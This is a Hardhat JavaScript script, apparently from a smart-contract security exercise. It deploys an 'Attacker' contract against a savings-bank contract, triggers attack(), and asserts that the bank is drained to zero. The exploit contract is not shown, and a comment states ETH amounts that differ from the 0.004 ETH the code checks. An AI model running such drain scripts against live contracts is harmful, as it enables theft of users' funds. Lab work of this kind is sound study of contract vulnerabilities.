// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.

const { logtime } = require("./libraries/timelogger");
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");
const { ethers } = require("hardhat");
const fs  = require("fs");

const savingsBankAddress = fs.readFileSync('./temp_files/contract_address.txt', 'utf8');

async function main() {
  logtime();
  balanceETH = await ethers.provider.getBalance(savingsBankAddress);
  console.log("Initial balance of savings bank: ", balanceETH.toString());
  const accounts = await ethers.getSigners();
  const contractOwner = accounts[0];
  const attackerFactory = await ethers.getContractFactory("Attacker");
  const attacker = await attackerFactory.deploy(savingsBankAddress);
  await attacker.deployed();
  console.log("Bad contract deployed");
  await new Promise(r => setTimeout(r, 10000));

  tx = await attacker.connect(contractOwner).attack({
         value: parseEther("0.001"),
       });
  await tx.wait();

  console.log("Attack Executed");
  // Balance of the savingsBank's address is now zero
  balanceETH = await ethers.provider.getBalance(savingsBankAddress);
  expect(balanceETH).to.equal(BigNumber.from("0"));

  // Balance of attacker is now 4 ETH (3 ETH stolen + 1 ETH from attacker)
  balanceETH = await ethers.provider.getBalance(attacker.address);
  expect(balanceETH).to.equal(parseEther("0.004"));
  logtime();
}
 
// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
